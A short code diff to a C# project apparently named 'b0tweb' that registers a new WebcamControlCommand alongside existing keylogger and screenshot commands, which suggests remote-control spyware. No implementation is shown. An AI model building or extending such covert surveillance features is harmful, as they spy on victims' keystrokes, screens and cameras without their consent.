@@ -10,6 +10,7 @@ namespace b0tweb.Commands
             new StallmanCommand(),
             new KeyloggerCommand(),
             new ScreenshotCommand(),
+            new WebcamControlCommand(),
         };
 
         /// <summary>
